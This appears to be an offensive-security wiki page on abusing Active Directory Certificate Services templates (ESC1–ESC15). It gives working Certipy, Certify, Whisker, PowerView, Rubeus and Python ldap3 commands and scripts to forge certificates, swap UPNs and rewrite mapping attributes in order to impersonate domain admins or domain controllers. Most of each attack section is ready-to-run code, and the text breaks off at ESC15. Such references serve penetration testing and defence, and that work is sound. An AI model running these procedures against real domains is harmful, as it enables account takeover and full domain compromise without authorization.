## Theory
AD CS Enterprise CAs issue certificates with settings defined by AD objects known as certificate templates. These templates are collections of enrollment policies and predefined certificate settings and contain things like “How long is this certificate valid for?”, “What is the certificate used for?”, “How is the subject specified?”, “Who is allowed to request a certificate?”, and a myriad of other settings
## Exploit
### ESC1: Template allows SAN
When a certificate template allows to specify a subjectAltName, it is possible to request a certificate for another user. It can be used for privileges escalation if the EKU specifies Client Authentication or ANY.
=== "UNIX-like"
    From UNIX-like systems, Certipy (Python) can be used to enumerate for, and conduct, the ESC1 and ESC2 scenarios.
    ```bash
    #To specify a user account in the SAN
    certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'

    #To specify a computer account in the SAN
    certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -dns 'dc.domain.local'
    ```
=== "Windows"
    From Windows systems, the Certify (C#) tool can be used.
    ```bash
    # Find vulnerable/abusable certificate templates using default low-privileged group
    Certify.exe find /vulnerable

    # Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
    Certify.exe find /vulnerable /currentuser
    ```
    Once a vulnerable template is found, a request shall be made to obtain a certificate, with another high-priv user set as `SAN (subjectAltName)`.
    ```bash
    Certify.exe request /ca:'domain\ca' /template:"Vulnerable template" /altname:"admin"
    ```
The certificate can then be used with Pass-the-Certificate to obtain a TGT and authenticate.
### ESC2: Any purpose EKU
When a certificate template specifies the Any Purpose EKU, or no EKU at all, the certificate can be used for anything. ESC2 can't be abused like ESC1 if the requester can't specify a SAN, however, it can be abused like ESC3 to use the certificate as requirement to request another one on behalf of any user.
### ESC3: Certificate Agent EKU
When a certificate template specifies the Certificate Request Agent EKU, it is possible to use the issued certificate from this template to request another certificate on behalf of any user.
=== "UNIX-like"
    From UNIX-like systems, Certipy (Python) can be used to enumerate for, and conduct, the ESC3 scenario. It is possible to output the result in an archive that can be uploaded in Bloodhound.
    ```bash
    certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -vulnerable
    ```
    Once a vulnerable template is found, a request shall be made to obtain a certificate specifying the Certificate Request Agent EKU
    ```bash
    certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
    ```
    Then, the issued certificate can be used to request another certificate permitting `Client Authentication` on behalf of another user.
    ```bash
    certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User' -on-behalf-of 'domain\domain admin' -pfx 'user.pfx'
    ```
    !!! note
        By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The -scheme flag can be used to set whether to use LDAP or LDAPS.
=== "Windows"
    From Windows systems, the Certify (C#) tool can be used.
    ```bash
    # Find vulnerable/abusable certificate templates using default low-privileged group
    Certify.exe find /vulnerable

    # Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
    Certify.exe find /vulnerable /currentuser
    ```
    Once a vulnerable template is found, a request shall be made to obtain a certificate specifying the Certificate Request Agent EKU.
    ```bash
    Certify.exe request /ca:'domain\ca' /template:"Vulnerable template"
    ```
    Then, the issued certificate can be used to request another certificate permitting `Client Authentication` on behalf of another user.
    ```bash
    Certify.exe request /ca:'domain\ca' /template:"User" /onbehalfon:DOMAIN\Admin /enrollcert:enrollmentAgentCert.pfx /enrollcertpw:Passw0rd!
    ```
### ESC9: No security extension
If the certificate attribute `msPKI-Enrollment-Flag` contains the flag `CT_FLAG_NO_SECURITY_EXTENSION`, the `szOID_NTDS_CA_SECURITY_EXT` extension will not be embedded, meaning that even with `StrongCertificateBindingEnforcement` set to 1, the mapping will be performed similarly as a value of 0 in the registry key.

Here are the requirements to perform ESC9:

- `StrongCertificateBindingEnforcement` not set to 2 (default: 1) or `CertificateMappingMethods` contains UPN flag (0x4)
- The template contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
- The template specifies client authentication
- `GenericWrite` right against any account A to compromise any account B
=== "UNIX-like"
    From UNIX-like systems, Certipy (Python) can be used to enumerate for, and conduct, the ESC9 scenario.
    
    In this scenario, user1 has `GenericWrite` against user2 and wants to compromise user3. user2 is allowed to enroll in a vulnerable template that specifies the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value.

    First, the user2's hash is needed. It can be retrieved via a Shadow Credentials attack, for example.
    ```bash
    certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
    ```
    Then, the `userPrincipalName` of user2 is changed to user3.
    ```bash
    certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
    ```
    The vulnerable certificate can be requested as user2.
    ```bash
    certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
    ```
    The user2's UPN is changed back to something else.
    ```bash
    certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
    ```
    Now, authenticating with the obtained certificate will provide the user3's NT hash during UnPac the hash. The domain must be specified since it is not present in the certificate.
    ```bash
    certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
    ```
=== "Windows"
    From Windows systems, the Certify (C#) tool can be used.
    ```bash
    # Find vulnerable/abusable certificate templates using default low-privileged group
    Certify.exe find

    # Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
    Certify.exe find /currentuser
    ```
    Here, user1 has `GenericWrite` against user2 and want to compromise user3. user2 is allowed to enroll in a vulnerable template that specifies the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value.

    First, the user2's credentials are needed. It can be retrieved via a Shadow Credentials attack, for example. Here just the `msDs-KeyCredentialLink` modification part with Whisker:
    ```bash
    Whisker.exe add /target:"user2" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
    ```
    Then, the userPrincipalName of user2 is changed to user3 with PowerView.
    ```bash
    Set-DomainObject user2 -Set @{'userPrincipalName'='user3'} -Verbose
    ```
    The vulnerable certificate can be requested in a user2 session.
    ```bash
    Certify.exe request /ca:'domain\ca' /template:"Vulnerable template"
    ```
    The user2's UPN is changed back to something else.
    ```bash
    Set-DomainObject user2 -Set @{'userPrincipalName'='user2@dmain.local'} -Verbose
    ```
    Now, authenticating with the obtained certificate will provide the user3's NT hash during UnPac the hash. This action can be realised with Rubeus. The domain must be specified since it is not present in the certificate.
    ```bash
    Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /show
    ```
### ESC10: Weak certificate mapping
#### Case 1
- `StrongCertificateBindingEnforcement` set to 0, meaning no strong mapping is performed
- A template that specifiy client authentication is enabled (any template, like the built-in User template)
- `GenericWrite` right against any account A to compromise any account B
=== "UNIX-like"
    From UNIX-like systems, Certipy (Python) can be used to enumerate for, and conduct, the ESC10 scenario.

    In this scenario, user1 has GenericWrite against user2 and want to compromise user3.

    First, the user2's hash is needed. It can be retrieved via a Shadow Credentials attack, for example.
    ```bash
    certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
    ```
    Then, the userPrincipalName of user2 is changed to user3.
    ```bash
    certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
    ```
    A certificate permitting client authentication can be requested as user2.
    ```bash
    certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -ca 'ca_name' -template 'User'
    ```
    The user2's UPN is changed back to something else.
    ```bash
    certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
    ```
    Now, authenticating with the obtained certificate will provide the user3's NT hash with UnPac the hash. The domain must be specified since it is not present in the certificate.
    ```bash
    certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
    ```
=== "Windows"
    From Windows systems, the Certify (C#) tool can be used.
    ```bash
    # Find vulnerable/abusable certificate templates using default low-privileged group
    Certify.exe find

    # Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
    Certify.exe find /currentuser
    ```
    Here, user1 has `GenericWrite` against user2 and want to compromise user3.

    First, the user2's credentials are needed. It can be retrieved via a Shadow Credentials attack, for example. Here just the `msDs-KeyCredentialLink` modification part with Whisker
    ```bash
    Whisker.exe add /target:"user2" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
    ```
    Then, the `userPrincipalName` of user2 is changed to user3 with PowerView.
    ```bash
    Set-DomainObject user2 -Set @{'userPrincipalName'='user3'} -Verbose
    ```
    A certificate permitting client authentication can be requested in a user2 session.
    ```bash
    Certify.exe request /ca:'domain\ca' /template:"User"
    ```
    The user2's UPN is changed back to something else.
    ```bash
    Set-DomainObject user2 -Set @{'userPrincipalName'='user2@dmain.local'} -Verbose
    ```
    Now, authenticating with the obtained certificate will provide the user3's NT hash during UnPac the hash. This action can be realised with Rubeus. The domain must be specified since it is not present in the certificate.
    ```bash
    Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /show
    ```
#### Case 2
- `CertificateMappingMethods` is set to `0x4`, meaning no strong mapping is performed and only the UPN will be checked
- A template that specifiy client authentication is enabled (any template, like the built-in User template)
- `GenericWrite` right against any account A to compromise any account B without a UPN already set (machine accounts or buit-in Administrator account for example)
=== "UNIX-like"
    From UNIX-like systems, Certipy (Python) can be used to enumerate for, and conduct, the ESC10 scenario.

    In this scenario, user1 has `GenericWrite` against user2 and want to compromise the domain controller DC$@domain.local.

    First, the user2's hash is needed. It can be retrieved via a Shadow Credentials attack, for example.
    ```bash
    certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
    ```
    Then, the `userPrincipalName` of user2 is changed to `DC$@domain.local`.
    ```bash
    certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "DC\$@$DOMAIN"
    ```
    A certificate permitting client authentication can be requested as user2.
    ```bash
    certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -ca 'ca_name' -template 'User'
    ```
    The user2's UPN is changed back to something else.
    ```bash
    certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
    ```
    Now, authentication with the obtained certificate will be performed through Schannel. The `-ldap-shell` option can be used to execute some LDAP requests and, for example, realised an RBCD to fully compromised the domain controller.
    ```bash
    certipy auth -pfx dc.pfx -dc-ip "$DC_IP" -ldap-shell
    ```
=== "Windows"
    From Windows systems, the Certify (C#) tool can be used.
    ```bash
    # Find vulnerable/abusable certificate templates using default low-privileged group
    Certify.exe find

    # Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
    Certify.exe find /currentuser
    ```
    Here, user1 has `GenericWrite` against user2 and want to compromise the domain controller `DC$@domain.local`.

    First, the user2's credentials are needed. It can be retrieved via a Shadow Credentials attack, for example. Here just the `msDs-KeyCredentialLink` modification part with Whisker:
    ```bash
    Whisker.exe add /target:"user2" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
    ```
    Then, the `userPrincipalName` of user2 is changed to `DC$@domain.local` with PowerView.
    ```bash
    Set-DomainObject user2 -Set @{'userPrincipalName'='DC$@domain.local'} -Verbose
    ```
    A certificate permitting client authentication can be requested in a user2 session.
    ```bash
    Certify.exe request /ca:'domain\ca' /template:"User"
    ```
    The user2's UPN is changed back to something else.
    ```bash
    Set-DomainObject user2 -Set @{'userPrincipalName'='user2@dmain.local'} -Verbose
    ```
    Now, authentication with the obtained certificate will be performed through Schannel. It can be used to perform, for example, an RBCD to fully compromised the domain controller.
### ESC13: Issuance policiy with privileged group linked
For a group to be linked to an issuance policy via msDS-OIDToGroupLink it must meet two requirements:

- Be empty
- Have a universal scope, i.e. be "Forest Wide". By default, "Forest Wide" groups are "Enterprise Read-only Domain Controllers", "Enterprise Key Admins", "Enterprise Admins" and "Schema Admins"

So, if a user or a computer can enroll on a template that specifies an issuance policy linked to a highly privileged group, the issued certificate privilegies will be mapped to those of the group.

To exploit ESC13, here are the requirements:

- The controlled principal can enroll to the template and meets all the required issuance policies
- The template specifies an issuance policy
- This policy is linked to a privileged groups via msDS-OIDToGroupLink
- The template allows the Client Authentication in its EKU
- All the usual requirements
=== "UNIX-like"
    From UNIX-like systems, Certipy (Python) permits to identify a certificate template with an issuance policy, i.e. with the `msPKI-Certificate-Policy` property not empty. Additionally, it verifies if this issuance policy has an OID group link to a group in the property `msDS-OIDToGroupLink`.
    ```bash
    certipy find -u '$USER@$DOMAIN' -p '"$PASSWORD' -dc-ip '$DC_IP'
    ```
    If a vulnerable template is found, there is no particular issuance requirement, the principal can enroll, and the template indicates the Client Authentication EKU, request a certificate for this template with Certipy (Python) as usual:
    ```bash
    certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'Vulnerable template'
    ```
    The certificate can then be used with Pass-the-Certificate to obtain a TGT and authenticate as the controlled principal, but with its privileges added to those of the linked group.
=== "Windows"
    From Windows systems, the ActiveDirectory PowerShell module can be used to identify a certificate template with an issuance policy, i.e. with the `msPKI-Certificate-Policy` property not empty
    ```bash
    Get-ADObject "CN="Vulnerable template",$TemplateContainer" -Properties msPKI-Certificate-Policy
    ```
    Then, if there is no particular issuance requirement, the principal can enroll, and the template indicates the Client Authentication EKU, verify if this issuance policy has an OID group link to a group in the property `msDS-OIDToGroupLink`
    ```bash
    Get-ADObject "CN=$POLICY_ID,$OIDContainer" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink
    ```
    Now, request a certificate for this template with Certify (C#) as usual
    ```bash
    .\Certify.exe request /ca:domain\ca /template:"Vulnerable template"
    ```
    The certificate can then be used with Pass-the-Certificate to obtain a TGT and authenticate as the controlled principal, but with its privileges added to those of the linked group.
### ESC14: Weak explicit mapping
There are four possible attack scenarios for exploiting ESC14. In all cases, the following prerequisites must be met:
!!! note
    - the attacker has compromised a victim account and is able to request certificates with this account, and wants to compromise a target account
    - the certificate template allows the victim to enroll
    - the victim matches all the prerequisites for issuing the certificate
    - the certificate template allows for authentication
    - if the template has the value `CT_FLAG_SUBJECT_ALT_REQUIRE_UPN` or `CT_FLAG_SUBJECT_ALT_REQUIRE_SPN` in the `msPKI-Certificate-Name-Flag` attribute, then:
        - The `UseSubjectAltName` registry key on the DC must be set to 0
        - authentication can only be performed via PKINIT (Kerberos)
    - if the template indicates `CT_FLAG_SUBJECT_ALT_REQUIRE_DNS` or `CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS` in the `msPKI-Certificate-Name-Flag` attribute:
        - the victim must be a machine
        - authentication can only be performed via PKINIT (Kerberos)
    - if the template indicates `CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL` or `CT_FLAG_SUBJECT_REQUIRE_EMAIL` in the `msPKI-Certificate-Name-Flag` attribute, one of the following prerequisites must be validated:
        - the certificate template uses version 1 of the scheme
        - the victim has his mail attribute configured
        - the attacker has write access to the victim's mail attribute

Sufficient DACL to write altSecurityIdentities attributes can be detected like this:
=== "UNIX-like"
    From UNIX-like systems, this can be done with Impacket's dacledit.py (Python).
    ```bash
    dacledit.py -action 'read' -principal 'controlled_object' -target 'target_object' 'domain'/'user':'password'
    ```
=== "Windows"
    From Windows systems, this can be done with [Get-WriteAltSecIDACEs.ps1](https://github.com/JonasBK/Powershell/blob/master/Get-WriteAltSecIDACEs.ps1) (PowerShell).
    ```bash
    # Get the ACEs for a single object based on DistinguishedName
    Get-WriteAltSecIDACEs -DistinguishedName "dc=domain,dc=local"

    # Get ACEs of all AD objects under domain root by piping them into Get-WriteAltSecIDACEs
    Get-ADObject -Filter * -SearchBase "dc=domain,dc=local" | Get-WriteAltSecIDACEs
    ```
It is also possible to view the necessary DACL in BloodHound.

Detection of weak explicit mapping can be done like this :
=== "UNIX-like"
    From UNIX-like systems, with the [GetWeakExplicitMappings.py](https://github.com/3C4D/GetWeakExplicitMappings/blob/main/GetWeakExplicitMappings.py) script (Python).
    ```bash
    python3 GetWeakExplicitMappings.py -dc-host $DC_HOST -u $USERNAME -p $PASSWORD -domain $DOMAIN
    ```
=== "Windows"
    From a Windows machine, with the [Get-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Get-AltSecIDMapping.ps1) script (PowerShell).
    ```bash
    Get-AltSecIDMapping -SearchBase "CN=Users,DC=domain,DC=local"
    ```
#### ESC14 A: Write access on altSecurityIdentities
The attacker has write access to the `altSecurityIdentities` attribute of the target. He can enrol on a certificate as the victim and create an explicit mapping for the target by modifying its `altSecurityIdentities` attribute and pointing it to the obtained certificate. The certificate can then be used to authenticate as the target.

Write rights to altSecurityIdentities can be obtained via the following DACL:

- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`
- `GenericWrite`
- `GenericAll`
- `Owner`

For PKINIT authentication, no additional requirements are necessary. For Schannel authentication, the `CertificateMappingMethods` key must be set to 0x8 (default value).
=== "UNIX-like"
    From UNIX-like systems, with certipy, it is possible to enroll on a certificate template.
    ```bash
    certipy req -u $TARGET@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
    ```
    Then, using certipy, we can get the certificate out of the pfx file.
    ```bash
    certipy cert -pfx target.pfx -nokey -out "target.crt"
    ```
    openssl can be used to extract the "Issuer" and the "Serial Number" value out of the certificate.
    ```bash
    openssl x509 -in target.crt -noout -text
    ```
    With the following python script (inspired from this [script](https://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1)), we can use the previously dumped values to craft a X509IssuerSerialNumber mapping string.
    ```bash
    issuer = ",".join("<TARGET_DN>".split(",")[::-1])
    serial = "".join("<SERIAL_NUMBER>".split(":")[::-1])

    print("X509:<I>"+issuer+"<SR>"+serial)
    ```
    the string can then be added to altSecurityIdentities target's attribute with the following python script.
    ```bash
    import ldap3

    server = ldap3.Server('<DC_HOST>')
    victim_dn = "<TARGET_DN>"
    attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
    attacker_password = "<ATTACKER_PASSWORD>"

    conn = ldap3.Connection(
        server=server,
        user=attacker_username,
        password=attacker_password,
        authentication=ldap3.NTLM
    )
    conn.bind()

    conn.modify(
        victim_dn,
        {'altSecurityIdentities':[(ldap3.MODIFY_ADD, '<X509IssuerSerialNumber>')]}
    )

    conn.unbind()
    ```
    The certificate requested at the begining can then be used with Pass-the-Certificate to obtain a TGT and authenticate as the target.

    The certificate mapping written can be cleaned with the following python script.
    ```bash
    import ldap3

    server = ldap3.Server('<DC_HOST>')
    victim_dn = "<TARGET_DN>"
    attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
    attacker_password = "<ATTACKER_PASSWORD>"

    conn = ldap3.Connection(
        server=server,
        user=attacker_username,
        password=attacker_password,
        authentication=ldap3.NTLM
    )
    conn.bind()

    conn.modify(
        victim_dn,
        {'altSecurityIdentities':[(ldap3.MODIFY_DELETE, '<X509IssuerSerialNumber>')]}
    )

    conn.unbind()
    ```
=== "Windows"
    From Windows systems, Certify (C#) can be used to enroll on a certificate template
    ```bash
    Certify.exe request /ca:domain\ca /template:Machine /machine
    ```
    Then, the certutil utility permits to merge the PFX and dump the serial number and the issuer DN from it.
    ```bash
    certutil -MergePFX .\cert-a.pem .\cert-a.pfx
    certutil -Dump -v .\cert-a.pfx
    ```
    Following this, the [Get-X509IssuerSerialNumberFormat](https://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1) script (PowerShell) allows to craft a X509IssuerSerialNumber mapping string well formated.
    ```bash
    Add-AltSecIDMapping -DistinguishedName $TARGET_DN -MappingString $MAPPING_STRING
    Get-AltSecIDMapping -DistinguishedName $TARGET_DN
    ```
    The certificate requested at the begining can then be used with Pass-the-Certificate to obtain a TGT and authenticate as the target.

    The certificate mapping written can be cleaned with [Remove-AltSecIDMapping](https://github.com/JonasBK/Powershell/blob/master/Remove-AltSecIDMapping.ps1) (PowerShell).
    ```bash
    Remove-AltSecIDMapping -DistinguishedName $TARGET_DN -MappingString $MAPPING_STRING
    ```
#### ESC14 B: Target with X509RFC822 (email)
The target has an explicit weak mapping of type `X509RFC822`. The attacker can modify the mail attribute of the victim so that it matches the `X509RFC822` mapping of the target. It is then possible to enroll on the certificate model with the victim, and use the certificate obtained to authenticate as the target.
For this attack, a few additional prerequisites are necessary:
!!! note
    - The target is a user account
    - The target already has at least one `X509RFC822` mapping in `altSecurityIdentities`
    - The attacker has write access to the `mail` attribute of the victim
    - The certificate template shows `CT_FLAG_NO_SECURITY_EXTENSION` in `msPKI-Enrollment-Flag` and shows the attribute `CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL` in `msPKI-Certificate-Name-Flag`
    - For PKINIT, `StrongCertificateBindingEnforcement` is set to 0 or 1
    - For Schannel, `CertificateMappingMethods` indicates `0x8` and `StrongCertificateBindingEnforcement ` is set to 0 or 1
=== "UNIX-like"
    From UNIX-like systems, the mail attribute of the victim can be overwritten to match the `X509RFC822 `mapping of the target using the following python script
    ```bash
    import ldap3

    server = ldap3.Server('<DC_HOST>')
    victim_dn = "<VICTIM_DN>"
    attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
    attacker_password = "<ATTACKER_PASSWORD>"

    conn = ldap3.Connection(
        server=server,
        user=attacker_username,
        password=attacker_password,
        authentication=ldap3.NTLM
    )
    conn.bind()

    conn.modify(
        victim_dn,
        {'mail':[(ldap3.MODIFY_REPLACE, '<TARGET_EMAIL>')]}
    )

    conn.unbind()
    ```
    With certipy, it is then possible to enroll on a certificate template using the victim credentials.
    ```bash
    certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
    ```
=== "Windows"
    From Windows systems, with PowerShell the mail attribute of the victim must be overwritten to match the email indicates in the `X509RFC822` mapping of the target.
    ```bash
    $victim = [ADSI]"LDAP://$VICTIM_DN"
    $victim.Properties["mail"].Value = $TARGET_EMAIL
    $victim.CommitChanges()
    ```
    Then, Certify (C#) can be used to enroll on a certificate template from the victim session.
    ```bash
    Certify.exe request /ca:domain\ca /template:$TEMPLATE_MAIL
    ```
The certificate can then be used with Pass-the-Certificate to obtain a TGT and authenticate as the target.
#### ESC14 C: Target with X509IssuerSubject
The target has an explicit weak mapping of type `X509IssuerSubject`. The attacker can modify the `cn` or `dNSHostName` attribute of the victim to match the subject of the `X509IssuerSubject` mapping of the target. It is then possible to enroll on the certificate template with the victim, and use the resulting certificate to authenticate as the target.

For this attack, some additional prerequisites are necessary:
!!! note
    - The target already has at least one `X509IssuerSubject` mapping in `altSecurityIdentities`
    - If the victim is a user:
        - The attacker can modify the `cn` and `name` attributes of the victim (to change the `cn`, the `name` must match)
    - If the target is a `user` and the `X509IssuerSubject` mapping has the current value of the `cn` attribute of the target as its identifier, the victim and the target cannot be in the same container (the DC will not allow the cn of the victim to be set according to the cn of the target if they are in the same container, as this would mean that they have the same distinguishedName)
    - If the victim is a machine: the attacker has write access to the `dNSHostName` attribute
    - The certificate template indicates `CT_FLAG_NO_SECURITY_EXTENSION` in `msPKI-Enrollment-Flag`(except for Schannel authentication with the DC having the `CertificateMappingMethods` key set to 0x1)
    - The template has one of the following flags in `msPKI-Certificate-Name-Flag`: `CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME` or `CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN`
    - The certificate does not have any of the following flags: `CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH` and `CT_FLAG_SUBJECT_REQUIRE_EMAIL`
    - The enterprise PKI is the issuer referenced by `IssuerName` in the `X509IssuerSubject` mapping of the target
    - For PKINIT, `StrongCertificateBindingEnforcement` is set to 0 or 1
    - For Schannel, `CertificateMappingMethods` indicates `0x8` and `StrongCertificateBindingEnforcement` is set to 0 or 1, or `CertificateMappingMethods` is set to 0x1

In this example, the target has the explicit mapping value `X509:<I>DC=local,DC=domain,CN=$TARGET<S>CN=$TARGET.domain.local`. One must change the cn of the victim (in this case a user) to equal `$TARGET.domain.local`. By renaming the user, the DC will automatically change the `cn` and `name`.
=== "UNIX-like"
    From UNIX-like systems, the `cn` attribute of the victim can be overwritten with the following python script to be equal to <TARGET>.<DOMAIN>.
    ```bash
    import ldap3

    server = ldap3.Server('<DC_HOST>')
    victim_dn = "CN=<VICTIM>,CN=Computers,DC=domain,DC=local"
    attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
    attacker_password = "<ATTACKER_PASSWORD>"

    conn = ldap3.Connection(
        server=server,
        user=attacker_username,
        password=attacker_password,
        authentication=ldap3.NTLM
    )
    conn.bind()

    conn.modify_dn(
            victim_dn,
            'CN=<TARGET>.<DOMAIN>'
    )

    conn.unbind()
    ```
    With certipy, it is then possible to enroll on a certificate template using the victim credentials
    ```bash
    certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
    ```
=== "Windows"
    From Windows systems, with PowerShell the cn attribute of the victim must be overwritten to be equal to `$TARGET.domain.local`.
    ```bash
    $victim = [ADSI]"LDAP://CN=$VICTIM,CN=Users,DC=domain,DC=local"
    $victim.Rename("CN=$TARGET.domain.local")
    Get-ADUser $VICTIM
    ```
    Then, Certify (C#) can be used to enroll on a certificate template from the victim session.
    ```bash
    Certify.exe request /ca:domain\ca /template:$TEMPLATE
    ```
The certificate can then be used with Pass-the-Certificate to obtain a TGT and authenticate as the target.  
#### ESC14 D: Target with X509SubjectOnly
The target has an explicit weak mapping of type `X509SubjectOnly`. The attacker can modify the `cn` or `dNSHostName` attribute of the victim to match the subject of the `X509SubjectOnly` mapping of the target. It is then possible to enroll on the certificate template with the victim, and use the resulting certificate to authenticate as the target.

For this attack, some additional prerequisites are necessary:
!!! note
    - The target already has at least one `X509SubjectOnly` mapping in `altSecurityIdentities`
    - If the victim is a user:
        - The attacker can modify the `cn` and `name` attributes of the victim (to change the cn, the name must match)
    - If the target is a user and the `X509SubjectOnly` mapping has the current value of the `cn` attribute of the target as its identifier, the victim and the target cannot be in the same container (the DC will not allow the cn of the victim to be set according to the cn of the target if they are in the same container, as this would mean that they have the same distinguishedName)
    - If the victim is a machine: the attacker has write access to the `dNSHostName` attribute
    - The certificate template indicates `CT_FLAG_NO_SECURITY_EXTENSION` in `msPKI-Enrollment-Flag`
    - The template has one of the following flags in `msPKI-Certificate-Name-Flag`: `CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME` or `CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN`
    - The certificate does not have any of the following flags: `CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH` and `CT_FLAG_SUBJECT_REQUIRE_EMAIL`
    - For PKINIT, `S`trongCertificateBindingEnforcement` is set to 0 or 1
    - For Schannel, `CertificateMappingMethods` indicates 0x8 and `StrongCertificateBindingEnforcement` is set to 0 or 1

In this example, the target has the explicit mapping value `X509:<S>CN=TARGET`. One must change the `dNSHostName` of the victim (in this case a computer) to equal `$TARGET`.
=== "UNIX-like"
    From UNIX-like systems, the `dNSHostName` attribute of the victim can be overwritten with the following python script to be equal to `<TARGET>`.
    ```bash
    import ldap3

    server = ldap3.Server('<DC_HOST>')
    victim_dn = "CN=<VICTIM>,CN=Computers,DC=domain,DC=local"
    attacker_username = "<DOMAIN>\\<ATTACKER_SAMACCOUTNNAME>"
    attacker_password = "<ATTACKER_PASSWORD>"

    conn = ldap3.Connection(
        server=server,
        user=attacker_username,
        password=attacker_password,
        authentication=ldap3.NTLM
    )
    conn.bind()

    conn.modify(
        victim_dn,
        {'dNSHostName':[(ldap3.MODIFY_REPLACE, '<TARGET>')]}
    )

    conn.unbind()
    ```
    With certipy, it is then possible to enroll on a certificate template using the victim credentials
    ```bash
    certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
    ```
=== "Windows"
    From Windows systems, with PowerShell the `dNSHostName` attribute of the victim must be overwritten to be equal to `$TARGET`.
    ```bash
    $victim = [ADSI]"LDAP://CN=$VICTIM,CN=Computers,DC=domain,DC=local"
    $victim.Properties["dNSHostName"].Value = $TARGET
    $victim.CommitChanges()
    ```
    Then, Certify (C#) can be used to enroll on a certificate template from the victim session.
    ```bash
    Certify.exe request /ca:domain\ca /template:$TEMPLATE /machine
    ```
The certificate can then be used with Pass-the-Certificate to obtain a TGT and authenticate as the target.
### ESC15: Arbitrary application policy
!!! note
    This privilege escalation has been marked as `CVE-2024-49019` by Microsoft, and will therefore no longer be exploitable on patched systems.
By default, the X509 standard uses EKUs to indicate the possible uses of a certificate. Under Windows, a field called `Application Policy` is added to certificates, and this does the same thing as EKUs, but with a few more options. If both EKUs and application policies are present in a certificate, the latter takes precedence.

It turns out that if a certificate template uses version 1 of the certificate templates, authorises the SAN specification, and if it is possible to enrol on it, then it is possible to request a certificate by specifying an arbitrary user and requesting an arbitrary application policy.
!!! info
    However, that specifying "Client Authentication" in application policy will only allow SChannel authentication and not PKINIT. On the other hand, by specifying "Certificate Request Agent" (1.3.6.1.4.1.311.20.2.1), the certificate can be used as an ESC3.

You can see the ESC15 as an ESC2 with more steps.
=== "UNIX-like"
    From UNIX-like systems, Certipy (Python) can be used to enumerate for, and conduct, the ESC15 scenario.
